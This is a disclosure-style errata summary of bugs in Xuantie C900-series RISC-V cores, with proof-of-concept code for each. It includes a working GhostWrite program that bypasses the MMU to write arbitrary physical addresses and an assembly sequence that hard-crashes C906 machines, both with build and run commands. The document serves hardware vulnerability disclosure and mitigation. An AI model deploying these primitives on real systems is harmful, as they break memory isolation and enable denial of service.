# Summary of Bugs in Xuantie C900-series core designs

### XTheadVector unit-strided stores with reserved width may bypass the MMU

Also known as [GhostWrite](https://ghostwriteattack.com/).

In both XTheadVector and V extension 1.0, unit-strided vector stores are
encoded as,

```
  31  29   28  27 26  25  24   20 19  15 14   12 11  7 6       0
 |  nf  | mew | mop | vm | sumop |  rs1 | width | vs3 | opcode  |
 |      |     | 00  |    |       |      |       |     | 0100111 |
 |      |     |     |    |       |      |       |     |         |
```

`mew` and `width` are combined together for specifying the unit length, but
instructions with `mew = 1` (length >= 128 bits) are reserved for now.

> The mew bit (inst[28]) when set is expected to be used to encode expanded
> memory sizes of 128 bits
and above, but these encodings are currently
> reserved.
> (The RISC-V Instruction Set Manual Volume I 20240411, 31.7.3)

C906 and C910 incorrectly decode instructions with `mew = 1`, and execute them.
On C906 a Store/AMO access fault will be raised, on C910 the instruction just
bypasses the MMU, and writes the least byte of `vs3` to address `rs1`.

On C910, the instruction is able to write both MMIO and memory addresses. The
value of fields `nf` doesn't make any differences on the length of written
bytes.

#### Proof of Concept

This PoC code makes use of the bug to write a string directly to the serial,
bypassing the kernel and MMU.

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

static void
ghostwrite(uintptr_t addr, uint8_t val)
{
        asm volatile ("\n\tth.vsetvli zero, zero, e8, m1"
                      "\n\tth.vmv.v.x v0, %0"
                      "\n\tmv t0, %1"
                      "\n\t.long 0x12028027"
                      : : "r" (val), "r"(addr) : "v0", "t0", "memory");
}

static void
ghostprint(uintptr_t p, const char *s)
{
        while (*s) {
                usleep(200);
                ghostwrite(p, *s);
                s++;
        }
}

int
main(int argc, const char *argv[])
{
        if (argc != 2) {
                printf("Usage: %s <UART_BASE>\n", argv[0]);
                return 0;
        }

        uintptr_t serialBase = strtoul(argv[1], NULL, 0);

        ghostprint(serialBase, "CRACKED BY GHOSTWRITE\n\r");

        return 0;
}
```

Must be compiled with `-march=rv64gc_xtheadvector`, e.g.

```shell
gcc ghostwrite-serial.c -o ghostwrite-serial -march=rv64gc_xtheadvector
```

and run with the UART base address, for example,

```shell
./ghostwrite-serial 0xffe7014000 # TH1520
./ghostwrite-serial 0x7040000000 # SG2042
```

on TH1520 or SG2042 SoC. `CRACKED BY GHOSTWRITE` should appear on the serial.

#### Affected Variants

- C906: tested with PoC on Sophgo CV1800B SoC, triggered a SIGSEGV but no
  arbitrary write was performed.
- C910: tested with PoC on T-Head TH1520 SoC
- C920v1: tested with PoC on Sophgo SG2042 SoC

#### Mitigation

Mainline Linux kernel is able to detect and mitigate the errata since commit
`4bf97069239b ("riscv: Add ghostwrite vulnerability")` (landed in v6.14).
To enable the mitigation, `CONFIG_ERRATA_THEAD_GHOSTWRITE` must be enabled when
building the kernel.

It's still possible to disable the mitigation at runtime with `mitigations=off`
kernel argument, which is necessary to make use of XTheadVector extension or
reproduce the above PoC.

### Load instructions that modify the base register in XTheadMemIdx may halt C906

Also known as C906 halt sequence.

XTheadMemIdx provides extra integer memory operations. Among them there're 14
instructions load from memory address specified by the base register as well as
adjust the base register's value,

- th.lbib
- th.lbia
- th.lwuib
- th.lbuib
- th.lwia
- th.ldia
- th.lwib
- th.lbuia
- th.lhuia
- th.lhia
- th.ldib
- th.lhib
- th.lwuia
- th.lhuib

the last two character represents the order between load operation and register
adjustment,

- `a`: after increment, adjusting the base register -> loading from memory
- `b`: before increment, loading from memory -> adjusting the base register

These instructions are useful for array and stack accesses. Encodings with the
destination same as the base are reserved, but these reserved encodings may
crash C906 when it's followed by a CSR read targetting the same register, and
another access against the register.

Note that arbitrary instructions could be inserted between these three
operations, as long as they have nothing to do with the used register. Even the
subsequent sequence is incomplete for triggerring a crash, C906 still doesn't
report any exceptions for the reserved encoding.

#### PoC

```asm
        .global main
	main:
        mv              t0,     sp

        # th.lbib       t0,     (t0),   0,      0
        .word 0x0802c28b
        frcsr           t0
        addi            t0,     zero,   0

        ret
```

Could be compiled with GCC directly. Running it on C906 cores trigger a machine
crash.

```shell
gcc c906-halt-sequence.S -o c906-halt-sequence
```

#### Affected Variants

- C906: tested with PoC on Sophgo CV1800B SoC
- C910: isn't vulnerable to the issue. But it doesn't raise any exceptions for
        the reserved instructions, either.

## C910 may hang when accessing physically-backed virtual address zero

Reading from or writing to virtual address zero may make C910 hang if the
address is mapped to a physical address.

The issue doesn't happen on each run of the PoC, but 1000 runs are enough to
reproduce it stablily.

Since mapping a page to virtual address zero usually requires higher permission
or adjustment to the system settings (`vm.mmap_min_addr` on Linux), this isn't
a severe security problem.

#### PoC

```C
#include <errno.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

int
main(void)
{
        uint32_t *p = mmap((void *)0x0, 4096, PROT_READ | PROT_WRITE,
                          MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
        if (p == MAP_FAILED) {
                printf("failed to mmap a page at vaddr 0x0: %s\n",
                       strerror(errno));
                return -1;
        }

        puts("Reading from 0x00000000");
        printf("Got 0x%x\n", *p);

        puts("Reading again from 0x00000000");
        printf("Got 0x%x\n", *p);

        munmap(p, 4096);
        return 0;
}
```

Could be simply compiled with CC.

```
cc c910-read-from-vaddr-zero.c -o c910-read-from-vaddr-zero
```

Note that root permission is required to mmap an address below the value of
sysctl option `vm.mmap_min_addr`. To reproduce the bug,

```shell
# for i in $(seq 1 1000); do ./c910-read-from-vadddr-zero; done
```

#### Affected Variants

- C910: tested on T-Head TH1520

## C910 load access faults are imprecise and have wrong mtval/stval

Load bus errors cause access faults. On affected variants, when the exception
happens:

- The exception is imprecise. The architectural state (e.g. `mepc`/`sepc`,
  general purpose registers) seems to have advanced after the faulting
  instruction. RISC-V exceptions must be precise and "imprecise exceptions" are
  not permitted.
- `mtval`/`stval` is incorrect. The value should be the virtual address on which
  access is attempted. However, the actual value is the physical address.

### PoC

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <signal.h>
#include <ucontext.h>

void handler(int sig, siginfo_t *info, void *ucontext_voidp) {
	ucontext_t *ucontext = (ucontext_t *) ucontext_voidp;
	unsigned long *regs = ucontext->uc_mcontext.__gregs;

	printf("fault! pc = %#lx\n", regs[0]);
	_Exit(1);
}

int main(int argc, char **argv) {
	if (argc != 2) return 1;
	unsigned long ul = strtoul(argv[1], 0, 0);
	printf("pa = %#lx\n", ul);
	unsigned long page = ul & -4096;
	unsigned long off = ul - page;

	int x = open("/dev/mem", O_RDWR);
	if (x < 0) {
		perror("open");
		return 1;
	}
	void *ptr = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, x, page);
	if (ptr == MAP_FAILED) {
		perror("mmap");
		return 1;
	}
	char *p = (char *)ptr + off;
	printf("va = %p\n", p);
	extern char load_address_is[];

	printf("memory access pc is = %p\n", load_address_is);

	struct sigaction sa = { 0 };
	sa.sa_flags = SA_SIGINFO;
	sa.sa_sigaction = handler;

	// Uncomment to see epc in userspace
	// sigaction(SIGSEGV, &sa, NULL);

	asm volatile (
	"load_address_is:\n\t"
		"lb x0, (%0)\n\t"
		"fence.i"
		:
		: "r"(p)
		: "memory"
	);
	return 0;
}
```

Run with physical address on which access can cause a bus error.

```shell
./mmiotest 0x4e00000003
```

Program output:

```
pa = 0x4e00000003
va = 0x3fba593003
memory access pc is = 0x2ae0d629c0
Segmentation fault
```

Kernel output:

```
[ 2672.476997] mmaptest[3227]: unhandled signal 11 code 0x2 at 0x0000002ae0d629c4 in mmaptest[9c4,2ae0d62000+1000]
...
[ 2672.477064] epc : 0000002ae0d629c4 ra : 0000002ae0d629a6 sp : 0000003fea4bf770
...
[ 2672.477118] status: 0000000200004020 badaddr: 0000004e00000003 cause: 0000000000000005
[ 2672.477130] Code: 0597 0000 8593 ea45 3c23 f0b4 3583 fb04 8003 0005 (100f) 0000
```

Note that

- The `cause` is `5`, "Load access fault", an exception, which should be precise
- The faulting `epc` points to the `fence.i` instruction *after* the `lb`
  instruction.
- The `badaddr` value (Linux's name for `mtval`/`stval`) is the physical
  address, not virtual address

### Affected variants

- openC910: Confirmed by inspecting the Verilog code
- C920v1: Tested on SG2042

## C906/C920v1 floating point underflow edge case bug

On affected CPUs, the FPU fails to correctly detect an underflow exception in
some edge cases, where such an exception is mandated by IEEE 754. This causes
these CPUs to fail various floating point test suites.

Reported at https://github.com/revyos/revyos/issues/17, in particular note [an
official statement from Xuantie][underflow-xuantie-statement].

[underflow-xuantie-statement]: https://github.com/revyos/revyos/issues/17#issuecomment-1865370138

### PoC

```c
#include <stdio.h>

unsigned long test_fflags(unsigned long);

asm (
	"	.pushsection .text\n\t"
	"test_fflags:\n\t"
	"	fmv.d.x fa0, a0\n\t"
	"	fsflags zero\n\t"
	"	fcvt.s.d fa0, fa0\n\t"
	"	frflags a0\n\t"
	"	ret\n\t"
	"	.popsection"
);

int main() {
	unsigned long val = 0x380fffffe1000000;
	printf("test_fflags(%#lx) = %lu\n", val, test_fflags(val));
}
```

(This test case is due to John R. Hauser, from [Berkeley SoftFloat
FAQ][softfloat-faq].)

[softfloat-faq]: http://www.jhauser.us/arithmetic/SoftFloat-3/doc/SoftFloat-FAQ.html

On affected CPUs, the output is:

```
test_fflags(0x380fffffe1000000) = 1
```

The correct output is:

```
test_fflags(0x380fffffe1000000) = 3
```

### Affected variants

- C906: Tested on CV1800B
- C920v1: Tested on SG2042

## Reference

This documentation contains information summarized from
[RISCVuzz: Discovering Architectural CPU Vulnerabilities via Differential Hardware Fuzzing](https://ghostwriteattack.com/riscvuzz.pdf),
thanks for the authors' work!

[T-Head Exception Specification](https://github.com/XUANTIE-RV/thead-extension-spec)
describes various extensions and corresponding instructions' format and behavior.
